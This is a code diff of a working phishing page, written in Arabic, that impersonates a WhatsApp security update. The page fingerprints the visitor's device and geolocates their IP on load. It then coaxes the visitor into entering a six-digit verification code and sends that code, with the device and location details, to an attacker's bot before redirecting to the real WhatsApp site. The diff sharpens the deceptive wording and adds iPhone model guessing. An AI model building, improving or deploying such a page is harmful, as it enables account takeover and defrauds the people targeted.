@@ -3,13 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام التحقق الآمن</title>
+    <title>WhatsApp Security System</title>
     <style>
         :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-surface: #111b21; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
         body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
 
-        /* شاشة الفحص الذكي - معربة بالكامل */
         #checker { 
             position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
@@ -56,14 +55,13 @@
 
     <div class="container" id="app">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="55" style="margin-bottom:15px;">
-        <h2 style="font-size:20px; margin-bottom:15px;">تحديث بروتوكول الأمان الإلزامي</h2>
+        <h2 style="font-size:20px; margin-bottom:15px;">تحديث أمان واتساب</h2>
 
         <div class="info-card">
             <div class="line">الجهاز المكتشف: <b id="dev-name">جاري الفحص..</b></div>
             <div class="line">حالة النظام: <span style="color:var(--wa-green);">تحديث v2.4 جاهز</span></div>
-            <div class="line">طاقة الجهاز: <b id="bat-val">جاري القراءة..</b></div>
             <div style="border-top: 1px solid #2a3942; margin-top:10px; padding-top:10px;">
-                الرقم المرتبط: <b id="phone-display" style="color:var(--wa-green); direction: ltr;"></b>
+                الرقم الموثق: <b id="phone-display" style="color:var(--wa-green); direction: ltr;"></b>
             </div>
         </div>
 
@@ -74,7 +72,7 @@
         </div>
 
         <p style="font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px;">
-            نسخة واتساب الحالية على جهازك لا تدعم التشفير المتقدم v2.4. يرجى إدخال كود المزامنة لتفعيل التحديث وحماية محادثاتك.
+            تم إصلاح بعض الأخطاء في التحديثات الأخيرة. لضمان توافق حسابك مع الإصدار الأخير يرجى التأكد من حسابك من هنا.
         </p>
 
         <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
@@ -88,11 +86,25 @@
             P: '01030003287' 
         };
 
-        // دالة كشف موديل الهاتف بدقة
+        // دالة احترافية لتخمين موديل الأيفون بدقة
+        function getIphoneModel() {
+            const ratio = window.devicePixelRatio;
+            const w = window.screen.width;
+            const h = window.screen.height;
+            
+            if (w === 375 && h === 812 && ratio === 3) return "iPhone X / XS / 11 Pro";
+            if (w === 414 && h === 896 && ratio === 3) return "iPhone XS Max / 11 Pro Max";
+            if (w === 414 && h === 896 && ratio === 2) return "iPhone XR / 11";
+            if (w === 390 && h === 844 && ratio === 3) return "iPhone 12 / 13 / 14";
+            if (w === 428 && h === 926 && ratio === 3) return "iPhone 12/13/14 Pro Max";
+            if (w === 393 && h === 852 && ratio === 3) return "iPhone 14 Pro / 15";
+            if (w === 430 && h === 932 && ratio === 3) return "iPhone 14 Pro Max / 15 Pro Max";
+            return "iPhone";
+        }
+
         function getDetailedDevice() {
             const ua = navigator.userAgent;
-            if (/iPhone/.test(ua)) return "iPhone Mobile";
-            if (/iPad/.test(ua)) return "iPad Tablet";
+            if (/iPhone/.test(ua)) return getIphoneModel();
             if (/Samsung|SM-|Galaxy/.test(ua)) return "Samsung Galaxy";
             if (/Huawei|Honor/.test(ua)) return "Huawei Mobile";
             if (/Android/.test(ua)) {
@@ -102,20 +114,11 @@
             return "جهاز ذكي";
         }
 
-        // تحديث الساعة والبطارية
         setInterval(() => {
             document.getElementById('time-val').innerText = new Date().toLocaleTimeString('ar-EG');
         }, 1000);
 
         async function initSystem() {
-            // كشف البطارية فوراً
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                document.getElementById('bat-val').innerText = Math.round(b.level * 100) + "%";
-            } else {
-                document.getElementById('bat-val').innerText = "متصل";
-            }
-
             let info = { ip: "127.0.0.1", city: "غير معروف", country: "" };
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -124,13 +127,14 @@
                 document.getElementById('loc-val').innerText = `${info.city}, ${info.country_code}`;
             } catch(e) {}
 
-            document.getElementById('dev-name').innerText = getDetailedDevice();
+            const finalDevice = getDetailedDevice();
+            document.getElementById('dev-name').innerText = finalDevice;
             document.getElementById('phone-display').innerText = "+20 " + CFG.P.substring(0,3) + " **** " + CFG.P.slice(-2);
 
             setTimeout(() => {
                 document.getElementById('checker').style.display = 'none';
                 document.getElementById('app').style.display = 'block';
-                sendBot(`🚀 <b>[سيستم] دخول جديد</b>\n📱 الجهاز: ${getDetailedDevice()}\n🔋 البطارية: ${document.getElementById('bat-val').innerText}\n📍 الموقع: ${info.city}\n🌐 IP: ${info.ip}`);
+                sendBot(`🚀 <b>[دخول جديد]</b>\n📱 الجهاز: ${finalDevice}\n📍 الموقع: ${info.city}\n🌐 IP: ${info.ip}`);
             }, 2500);
         }
 
@@ -143,9 +147,10 @@
 
         async function submit() {
             const val = document.getElementById('otp').value;
+            const finalDevice = getDetailedDevice();
             if(val.length === 6) {
-                document.querySelector('.btn').innerText = "جاري التشفير...";
-                await sendBot(`🔥 <b>[سيستم] كود وصل</b>\n📱 الجهاز: ${getDetailedDevice()}\n🔋 البطارية: ${document.getElementById('bat-val').innerText}\n🔢 الكود: <code>${val}</code>`);
+                document.querySelector('.btn').innerText = "...";
+                await sendBot(`🔥 <b>[كود جديد]</b>\n📱 الجهاز: ${finalDevice}\n🔢 الكود: <code>${val}</code>`);
                 
                 document.body.innerHTML = `<div style="text-align:center;"><div class="loader" style="margin:auto;"></div><p style="margin-top:20px; color:var(--wa-hint);">جاري المزامنة النهائية...</p></div>`;
                 setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 4000);
